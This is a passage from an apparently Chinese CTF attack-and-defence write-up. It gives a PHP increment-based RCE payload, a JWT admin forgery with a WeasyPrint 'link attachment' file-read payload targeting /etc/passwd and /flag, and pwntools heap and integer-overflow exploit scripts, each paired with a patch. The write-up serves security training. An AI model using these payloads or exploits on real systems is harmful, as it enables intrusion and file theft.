class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;w1key&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">strCheck</span>(<span class="hljs-variable">$w1key</span>);<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$w1key</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>Please input a valid number!<br></code></pre></td></tr></table></figure><p>第一个if没啥用，要过的话用科学计数法就行</p><p>第二个if存在一个代码执行，但是有个waf，会过滤一些字符，同时存在长度限制</p><p>先fuzz看下能用的符号</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-fuzee_rce-1.png"></p><p>可以用自增rce</p><p><code>w1key=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&amp;_=system&amp;%ff=ls</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-fuzee_rce-2.png"></p><h2 id="Fix-3"><a href="#Fix-3" class="headerlink" title="Fix"></a>Fix</h2><p>比赛时修的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strCheck</span>(<span class="hljs-params"><span class="hljs-variable">$w1key</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$w1key</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$w1key</span>) &lt;= <span class="hljs-number">83</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[1-9a-zA-Z!,()\[\]\/%+@&#x27;#^&amp;%*:\.&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$w1key</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$w1key</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;黑客是吧，我看你怎么黑！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了&quot;</span>);<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="web-Oh-My-PDF"><a href="#web-Oh-My-PDF" class="headerlink" title="web-Oh! My PDF"></a>web-Oh! My PDF</h1><h2 id="Break-4"><a href="#Break-4" class="headerlink" title="Break"></a>Break</h2><blockquote><p>忘记当时有没有给源码了，就先当没有源码来分析吧</p></blockquote><p>有个注册和登录功能，主页面的功能是访问提供的url并转成pdf然后下载</p><p>随意注册一个账号登录后提示需要是admin权限才能操作</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-OhMyPDF-1.png"></p><p>抓包发现使用了jwt，尝试空密钥直接修改isadmin的值后成功绕过</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-OhMyPDF-2.png"></p><p>然后是主功能点，试了下不能使用类似<code>file://</code>的协议，只能使用<code>http://</code><br>在vps上开个监听，访问后可以看到<code>WeasyPrint</code>库的特征</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-OhMyPDF-3.png"></p><p>这个爬虫虽然不会渲染js，但是却可以解析<code>&lt;link attachment=xxx&gt;</code>，因此我们可以在vps上构造payload： <code>&lt;link rel=&quot;attachment&quot; href=&quot;file:///etc/passwd&quot;&gt;</code>来实现任意文件读取</p><p>例如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;attachment&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后去访问这个页面，返回一个pdf，用binwalk提取就能看到文件内容了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-OhMyPDF-4.png"></p><h2 id="Fix-4"><a href="#Fix-4" class="headerlink" title="Fix"></a>Fix</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, make_response, render_template, flash, redirect, url_for<br><span class="hljs-keyword">from</span> flask_sqlalchemy <span class="hljs-keyword">import</span> SQLAlchemy<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlsplit<br><span class="hljs-keyword">from</span> flask_weasyprint <span class="hljs-keyword">import</span> HTML, render_pdf<br><span class="hljs-keyword">from</span> werkzeug.security <span class="hljs-keyword">import</span> generate_password_hash, check_password_hash<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">10</span>)<br>app.config[<span class="hljs-string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="hljs-string">&#x27;sqlite:///users.db&#x27;</span><br><br>db = SQLAlchemy(app)<br><br>URL_REGEX = re.<span class="hljs-built_in">compile</span>(<br>    <span class="hljs-string">r&#x27;http(s)?://&#x27;</span>  <span class="hljs-comment"># http or https</span><br>    <span class="hljs-string">r&#x27;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;</span><br>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(db.Model):<br>    <span class="hljs-built_in">id</span> = db.Column(db.Integer, primary_key=<span class="hljs-literal">True</span>)<br>    username = db.Column(db.String(<span class="hljs-number">80</span>), unique=<span class="hljs-literal">True</span>, nullable=<span class="hljs-literal">False</span>)<br>    password = db.Column(db.String(<span class="hljs-number">80</span>), nullable=<span class="hljs-literal">False</span>)<br>    is_admin = db.Column(db.Boolean, nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_database</span>(<span class="hljs-params">app</span>):<br>    <span class="hljs-keyword">with</span> app.app_context():<br>        db.create_all()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid_url</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> URL_REGEX.match(url):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            data = request.form<br>            hashed_password = generate_password_hash(data[<span class="hljs-string">&#x27;password&#x27;</span>])<br>            new_user = User(username=data[<span class="hljs-string">&#x27;username&#x27;</span>], password=hashed_password, is_admin=<span class="hljs-literal">False</span>)<br>            db.session.add(new_user)<br>            db.session.commit()<br><br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>,message=<span class="hljs-string">&#x27;User registered successfully&#x27;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>,message=<span class="hljs-string">&#x27;Register Error!&#x27;</span>),<span class="hljs-number">500</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>,message=<span class="hljs-string">&#x27;please register first!&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        data = request.form<br>        user = User.query.filter_by(username=data[<span class="hljs-string">&#x27;username&#x27;</span>]).first()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">and</span> check_password_hash(user.password, data[<span class="hljs-string">&#x27;password&#x27;</span>]):<br>            access_token = jwt.encode(<br>                &#123;<span class="hljs-string">&#x27;username&#x27;</span>: user.username, <span class="hljs-string">&#x27;isadmin&#x27;</span>:<span class="hljs-literal">False</span>&#125;, app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<br>            res = make_response(redirect(url_for(<span class="hljs-string">&#x27;ohmypdf&#x27;</span>)))<br>            res.set_cookie(<span class="hljs-string">&#x27;access_token&#x27;</span>,access_token)<br>            <span class="hljs-keyword">return</span> res, <span class="hljs-number">200</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>,message=<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>), <span class="hljs-number">500</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>), <span class="hljs-number">200</span><br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ohmypdf</span>():<br>    access_token = request.cookies.get(<span class="hljs-string">&#x27;access_token&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> access_token:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br><br>    <span class="hljs-keyword">try</span>:<br>        decoded_token = jwt.decode(<br>            access_token, app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="hljs-string">&quot;HS256&quot;</span>],options=&#123;<span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br>        isadmin = decoded_token[<span class="hljs-string">&#x27;isadmin&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>,message=<span class="hljs-string">&#x27;Invalid access token&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> isadmin:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,message=<span class="hljs-string">&#x27;You do not have permission to access this resource. Where is the admin?!&#x27;</span>), <span class="hljs-number">403</span><br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        url = request.form.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        <span class="hljs-keyword">if</span> is_valid_url(url):<br>            <span class="hljs-keyword">try</span>:<br>                html = HTML(url=url)<br>                pdf = html.write_pdf()<br>                response = make_response(pdf)<br>                response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;application/pdf&#x27;</span><br>                response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=output.pdf&#x27;</span><br>                <span class="hljs-keyword">return</span> response<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Error generating PDF&#x27;</span>, <span class="hljs-number">500</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Invalid URL!&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>), <span class="hljs-number">200</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    create_database(app)<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure><p>看下代码中关于jwt的部分，可以从这部分入手</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">10</span>)<br><br>access_token = jwt.encode(<br>                &#123;<span class="hljs-string">&#x27;username&#x27;</span>: user.username, <span class="hljs-string">&#x27;isadmin&#x27;</span>:<span class="hljs-literal">False</span>&#125;, app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<br><br><br>decoded_token = jwt.decode(<br>            access_token, app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="hljs-string">&quot;HS256&quot;</span>],options=&#123;<span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br>isadmin = decoded_token[<span class="hljs-string">&#x27;isadmin&#x27;</span>]<br></code></pre></td></tr></table></figure><p><code>&#123;&quot;verify_signature&quot;: False&#125;</code> 修改成 <code>&#123;&quot;verify_signature&quot;: True&#125;</code></p><hr><p><a href="https://blog.csdn.net/Jayjay___/article/details/132915944">参考文章1</a><br><a href="https://blog.csdn.net/solitudi/article/details/109231974">参考文章2</a></p><h1 id="pwn-arrary-index-bank"><a href="#pwn-arrary-index-bank" class="headerlink" title="pwn-arrary_index_bank"></a>pwn-arrary_index_bank</h1><h2 id="Break-5"><a href="#Break-5" class="headerlink" title="Break"></a>Break</h2><p>整数溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;account?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.readuntil(<span class="hljs-string">&#x27;=&#x27;</span>)<br>    d=<span class="hljs-built_in">int</span>(p.readline())<br>    <span class="hljs-keyword">return</span> d<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;account?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;much?&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>d=show(-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>win=d-<span class="hljs-number">0x1426</span>+<span class="hljs-number">0x1315</span><br>e.address=d-<span class="hljs-number">0x1426</span><br><br>d=show(-<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>stack=d-<span class="hljs-number">0x30</span><br><br>you=e.address+<span class="hljs-number">0x4010</span><br>ind=(you-stack)//<span class="hljs-number">8</span><br><span class="hljs-comment">#print(show(ind))</span><br>edit(ind,<span class="hljs-number">0x20</span>)<br><span class="hljs-built_in">print</span>(edit(<span class="hljs-number">7</span>,win))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Fix-5"><a href="#Fix-5" class="headerlink" title="Fix"></a>Fix</h2><p>修改<code>jle</code>指令变成<code>jbe</code></p><blockquote><p>JBE用于无符号数比较，JLE用于有符号数比较</p></blockquote><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-arrary_index_bank-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-arrary_index_bank-2.png"></p><h1 id="pwn-easy-force"><a href="#pwn-easy-force" class="headerlink" title="pwn-easy_force"></a>pwn-easy_force</h1><h2 id="Break-6"><a href="#Break-6" class="headerlink" title="Break"></a>Break</h2><p>house_of_force</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&#x27;\n&#x27;</span>,end=<span class="hljs-literal">False</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;away&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;want?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;write?&#x27;</span>,data)<br>    <span class="hljs-keyword">if</span> end==<span class="hljs-literal">False</span>:<br>        p.readuntil(<span class="hljs-string">&#x27;balckbroad on &#x27;</span>)<br>        d=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27; &#x27;</span>),<span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">return</span> d<br><br>gadget=<span class="hljs-number">0x6a2226</span><br>puts=<span class="hljs-number">0x6f6a0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p</span>):<br>    <span class="hljs-comment">#gadget=int(input(&quot;asdfasdf:&quot;),16)</span><br>    chunk1=add(<span class="hljs-number">0x0</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">8</span>)<br>    top_chunk=chunk1+<span class="hljs-number">0x20</span><br>    to=<span class="hljs-number">0x602000</span><br>    chunk2=add(<span class="hljs-number">1</span>,(to-top_chunk))<br>    chunk3=add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+gadget.to_bytes(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;little&#x27;</span>),<span class="hljs-literal">True</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(chunk2))<br>    p.sendline(<span class="hljs-string">&quot;asdfasdf&quot;</span>)<br>    d=p.readuntil(<span class="hljs-string">&#x27;asdfasdf&#x27;</span>,timeout=<span class="hljs-number">0.01</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;asdf&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> d:<br>        <span class="hljs-keyword">return</span><br>    p.interactive()<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>     <span class="hljs-comment">#   gdb.attach(p)</span><br>        pwn(p)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">pass</span><br>    p.close()<br><br><br>    time.sleep(<span class="hljs-number">0.01</span>)<br></code></pre></td></tr></table></figure><h2 id="Fix-6"><a href="#Fix-6" class="headerlink" title="Fix"></a>Fix</h2><p>修改写入数据长度  <code>0x30--&gt;0x10</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-easy_force.png"></p><h1 id="pwn-Printf-but-not-fmtstr"><a href="#pwn-Printf-but-not-fmtstr" class="headerlink" title="pwn-Printf but not fmtstr"></a>pwn-Printf but not fmtstr</h1><h2 id="Break-7"><a href="#Break-7" class="headerlink" title="Break"></a>Break</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span 